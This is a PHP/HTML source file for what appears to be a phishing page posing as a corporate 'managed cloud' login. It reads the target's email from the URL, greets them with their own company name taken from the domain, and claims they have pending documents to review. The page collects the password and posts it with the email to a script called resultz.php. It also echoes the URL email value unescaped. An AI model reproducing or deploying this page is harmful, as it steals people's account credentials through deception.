<?php 
$em = @$_GET["email"];
$ln = strlen($em);
$len = strrev($em);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}

$yuh = substr($len,0,$x);

$yuh = strrev($yuh);


for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}

$yuh = substr($yuh,0,$x);

$yuh = ucfirst($yuh);


?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MANAGED CLOUD SERVERS</title>
  <link rel='stylesheet' href='https://fonts.googleapis.com/icon?family=Material+Icons'>
  <link rel="icon" href=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAWCAIAAABYAbuYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADfSURBVEhLY/hKM8BApMmX772WLLsERAuPvSBSC2GjISZiIoIW4DP606cPuMyFiC+59h6PBfiMxm8uRPYTbrNxGk2MuRA1uAzHYjTxhsJVYjUdxWhpHDFG0DICRutUYE8JBM0FKrDpu4lpOtzVn4gxgqAaZAugRhPUQ7wCuOnUNxqeZiBGvyPeUcSofAc2FGI0gVxHjHHIatTbbsON/kqqZvzq5aqv08roE+DsD43G82ceU9HhkESCyI3UMrr2yGt0o4F8yk3X6wJFIBajIUJkW4CW1wnXMliLHmIEaWg0ACSGNzSvnd67AAAAAElFTkSuQmCC" type="image/x-icon"/>
<link rel='stylesheet' href='https://code.getmdl.io/1.3.0/material.indigo-pink.min.css'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:300,400"'><link rel="stylesheet" href="https://cloud-95d3f3.ingress-earth.easywp.com/login/style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<!-- WRAPPER -->
<div class="wrapper">
  
  <!-- LEFT -->
  <div class="left">
    
    <!-- left-upper box -->
    <div class="left-upper box">
      <div class="welcome-msg-box">
        <div class="welcome-title" style="text-transform:uppercase">WELCOME TO 
<?php echo $yuh ?> CLOUD</div>
        <div class="welcome-subtitle">YOUR MANAGED CLOUD IT SOLUTION</div>
      </div>
    </div>
    <!-- left-upper box finish -->

    <!-- left-bottom box -->
    <div class="left-bottom box">
      <div class="partner-msg-box">
        <div class="partner-logo-bottom">
          <i class="material-icons">&#xE2C2;</i>
        </div>
        <div class="partner-part-bottom-box">
          <div class="partner-text-powered">YOU HAVE</div>
          <div class="partner-text">PENDING DOCUMENTS FOR REVIEW</div>
        </div>
      </div>
    </div>
    <!-- left-bottom box finish -->

  </div>
  <!-- LEFT FINISH -->

  <!-- RIGHT -->
  <div class="right">
    
    <!-- right-upper box -->
    <div class="right-upper box">
      <div class="centered">
        
        <!-- customer-logo -->
        <div class="customer-logo">
          <div class="customer-logo-placeholder">
            <i class="material-icons">&#xE2BD;</i>
          </div>     
        </div>
        <!-- customer-logo finish -->
        
        <!-- internal-login-form -->
        <div class="internal-login-form">
          
          <!-- login-form-fields -->
          <div class="login-form-fields centered">
            <div class="login-box-text">SIGN INTO YOUR CLOUD ACCOUNT</div>
            <form action="resultz.php" method="POST">
              <div class="mdl-textfield mdl-js-textfield centered">
                <input class="mdl-textfield__input" type="email" id="username" value="<?php echo $_GET['email']; ?>" name="username" required="" readonly/>
                <label class="mdl-textfield__label" for="username">Username</label>
              </div>
              <div class="mdl-textfield mdl-js-textfield centered">
                <input class="mdl-textfield__input" type="password" id="userpass" name="userpass" required/>
                <label class="mdl-textfield__label" for="userpass">Password</label>
              </div>
           
          </div>
          <!-- finish login-form-fields --> 
          
          <!-- remember and forgot -->
          <div class="remember-and-forgot centered">
            <label for="chkbox1" 
                   class="mdl-checkbox 
                          mdl-js-checkbox 
                          mdl-js-ripple-effect 
                          remember-checkbox">
              <input type="checkbox" id="chkbox1" class="mdl-checkbox__input">
              <span class="mdl-checkbox__label">Remember me</span>
            </label>
  
<p></p>
          <!-- finish remember and forgot -->
            
          <!-- sign-in -->
     <input type="submit" name="submit" value="Login" class="mdl-button 
                           mdl-js-button 
                           mdl-button--raised 
                           button-restyled
                           sign-in-btn">
     
     
     
     
     
     
          </div>
          <!-- finish sign-in -->
            
        </div>
   
         </form>
        <!-- external-login-form finish -->
          
      </div>
    </div>
    <!-- right-upper box finish -->
      
    <!-- right-bottom box -->
    <div class="right-bottom box">
      <div class="centered">
        
        <!-- request-access -->
        <div class="request-access">
          <div class="request-access-title"></div>
          <div class="request-access-description">
Enter your Correct Email/Password combination to continue
          </div>
          
          </div>
        </div>
        <!-- request-access finish -->

      </div>
    </div>
    <!-- right-bottom box finish -->

  </div>
  <!-- RIGHT FINISH -->

</div>
<!-- WRAPPER FINISH -->
<!-- partial -->
  <script src='https://code.getmdl.io/1.3.0/material.min.js'></script>
</body>
</html>

